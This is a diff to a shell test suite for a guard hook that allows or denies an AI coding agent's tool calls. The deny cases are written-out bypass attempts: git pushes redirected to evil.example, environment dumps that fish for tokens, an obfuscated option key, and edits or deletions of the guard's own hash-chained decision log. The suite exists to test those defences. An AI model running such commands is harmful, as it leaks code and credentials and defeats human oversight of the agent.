@@ -116,6 +116,14 @@ t deny '{"tool_name":"mcp__claude-code-remote__update_trigger","tool_input":{"tr
 # --- D-008: Workflow in-process only (T3)
 t allow '{"tool_name":"Workflow","tool_input":{"script":"export const meta = {name:\"x\",description:\"x\"}\nawait agent(\"read\", {label:\"a\"})"}}'
 t deny '{"tool_name":"Workflow","tool_input":{"script":"export const meta = {name:\"x\",description:\"x\"}\nawait agent(\"x\", {isolation: \"worktree\"})"}}'
+t deny '{"tool_name":"Workflow","tool_input":{"name":"some-saved-workflow"}}'
+t deny '{"tool_name":"Workflow","tool_input":{"scriptPath":"does/not/exist.js"}}'
+t deny '{"tool_name":"Workflow","tool_input":{"script":"const o = {[\"iso\"+\"lation\"]: \"x\"}; await agent(\"x\", o)"}}'
+t deny '{"tool_name":"Workflow","tool_input":{"script":"await agent(\"x\", {mode: \"remote\"})"}}'
+t allow '{"tool_name":"Workflow","tool_input":{"script":"await agent(\"Create a scratch git worktree under /tmp and run the tests there\", {label:\"t\"})"}}'
+wf=$(mktemp -d); printf 'export const meta = {name:"x",description:"x"}\nawait agent("read", {label:"a"})\n' > "$wf/ok.js"
+t allow "{\"tool_name\":\"Workflow\",\"tool_input\":{\"scriptPath\":\"ok.js\"},\"cwd\":\"$wf\"}"
+rm -rf "$wf"
 # --- D-008: GitHub (M3 to M7)
 t deny "{\"tool_name\":\"mcp__github__create_or_update_file\",\"tool_input\":{$D,\"path\":\"x\",\"branch\":\"main\"}}"
 t deny "{\"tool_name\":\"mcp__github__push_files\",\"tool_input\":{$D,\"branch\":\"refs/heads/main\"}}"
@@ -174,6 +182,60 @@ b deny  "git config core.hooksPath /tmp/hooks"
 b deny  "git update-index --assume-unchanged .claude/settings.json"
 b allow "git config --get remote.origin.url"
 b allow "git -C /tmp/scratch config user.name Builder"
+# --- R-D008-1 B-1: pushes rerouted by git settings (B11, B3)
+b deny  "git -c remote.origin.pushurl=https://evil.example/x push origin claude/x"
+b deny  "git -c url.https://evil.example/.pushInsteadOf=https://github.com/ push origin claude/x"
+b deny  "git -c user.name=x push origin claude/x"
+b deny  "git --config-env=remote.origin.pushurl=EVIL push origin claude/x"
+b deny  "git -C /tmp/scratch config remote.origin.pushurl https://evil.example/x.git"
+b deny  "git -C /tmp/scratch config url.https://evil.example/.pushInsteadOf https://github.com/"
+b deny  "git -C /tmp/scratch config core.sshCommand 'ssh -i x'"
+b deny  "git config --global user.name x"
+b deny  "git -C /tmp/scratch config --file /tmp/x.cfg user.name x"
+b deny  "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.pushurl GIT_CONFIG_VALUE_0=x git push origin claude/x"
+b deny  "export GIT_SSH_COMMAND=x; git push origin claude/x"
+b deny  "git push --tags origin claude/x"
+b deny  "git push --follow-tags origin claude/x"
+b deny  "git push ../other-repo claude/x"
+b allow "git -C /tmp/scratch config user.email builder@example.invalid"
+b allow "git -c core.quotepath=off status"
+b allow "git -C /tmp/scratch config --get-regexp remote"
+b allow "git -C /tmp/scratch config --list"
+# a real repository whose push address differs from its fetch address (R-D008-1 reproduction)
+pr=$(mktemp -d); git -C "$pr" init -q; git -C "$pr" remote add origin https://github.com/batuhanozgun/devos
+git -C "$pr" config remote.origin.pushurl "$pr/elsewhere.git"
+b deny  "git -C $pr push origin claude/x"
+git -C "$pr" config --unset remote.origin.pushurl
+git -C "$pr" config url."$pr/elsewhere.git".pushInsteadOf https://github.com/batuhanozgun/devos
+b deny  "git -C $pr push origin claude/x"
+git -C "$pr" config --unset url."$pr/elsewhere.git".pushInsteadOf
+b allow "git -C $pr push origin claude/x"
+rm -rf "$pr"
+# --- R-D008-1 B-2: environment dumps and indirect expansion (B8)
+b deny  "set"
+b deny  "set | grep TOKEN"
+b deny  "export -p"
+b deny  "export"
+b deny  "declare -x"
+b deny  "declare -p"
+b deny  "typeset -x"
+b deny  "compgen -v"
+b deny  "x=GH_TOKEN; echo \${!x}"
+b deny  "ps eww"
+b allow "set -euo pipefail; git status"
+b allow "export FOO=1; echo ok"
+b allow "declare -a arr=(1 2)"
+b allow "ps aux | head -3"
+b allow "ps -p 1 -o etime"
+# --- R-D008-1 m-1: the decision log is written only by the guard
+t deny "{\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"$DEVOS_GUARD_LOG_DIR/x.jsonl\"}}"
+b deny  "echo {} >> $DEVOS_GUARD_LOG_DIR/x.jsonl"
+b deny  "rm $DEVOS_GUARD_LOG_DIR/x.jsonl"
+# --- R-D008-1 m-6: live-tree history, and HEAD as a revision
+b deny  "git reflog expire --expire=now --all"
+b deny  "git gc --prune=now"
+b allow "git -C /tmp/scratch gc --prune=now"
+t deny "{\"tool_name\":\"mcp__claude-code-remote__create_session\",\"tool_input\":{$S,\"source_revision\":\"HEAD\"}}"
 b allow "git merge --ff-only origin/main"
 b allow "git pull --ff-only origin main"
 b allow "git stash list"
@@ -274,6 +336,22 @@ else
   echo "info main has no .claude/settings.json yet: a session on main is correctly denied"
 fi
 t $bok "{\"tool_name\":\"mcp__claude-code-remote__create_session\",\"tool_input\":{$S,\"source_revision\":\"$br\",\"environment_id\":\"env_01AMBDuHjjTsXMeXFyYgk1zR\",\"outcome_branch\":\"claude/x\"}}"
+# --- R-D008-1 m-1 and m-6: numbering under parallel calls, and the hash chain
+pl=$(mktemp -d)
+for i in 1 2 3 4 5 6 7 8; do printf '{"tool_name":"Read","tool_input":{"file_path":"/tmp/x"}}' | DEVOS_GUARD_LOG_DIR="$pl" python3 "$hook" >/dev/null & done; wait
+python3 - "$pl" <<'EOF' && echo "ok   8 parallel decisions got 8 distinct numbers and an intact chain" || { echo "BAD  parallel numbering or chain"; fail=1; }
+import hashlib, json, os, sys
+f = [os.path.join(sys.argv[1], x) for x in os.listdir(sys.argv[1])][0]
+raw = open(f, "rb").read().splitlines()
+recs = [json.loads(r) for r in raw]
+ok = sorted(r["n"] for r in recs) == list(range(1, 9))
+ok &= all(recs[i]["prev"] == (hashlib.sha256(raw[i - 1]).hexdigest() if i else "") for i in range(len(recs)))
+raise SystemExit(0 if ok else 1)
+EOF
+python3 tools/guard_report.py --session "" --dir "$pl" | grep -q "Hash chain: intact" && echo "ok   guard_report finds the chain intact" || { echo "BAD  guard_report chain"; fail=1; }
+f=$(ls "$pl"/*.jsonl); sed -i '3s/"decision": "allow"/"decision": "deny"/' "$f"
+python3 tools/guard_report.py --session "" --dir "$pl" | grep -q "Hash chain: BROKEN" && echo "ok   guard_report finds an edited record" || { echo "BAD  guard_report missed an edit"; fail=1; }
+rm -rf "$pl"
 # --- (b) no output anywhere says "ask"; (c) every denial carries rule, attempt, reason, place and alternative
 grep -q '"ask"' "$OUTS" && { echo "BAD  an output answered ask"; fail=1; } || echo "ok   no output answered ask"
 python3 - "$OUTS" <<'EOF' || fail=1
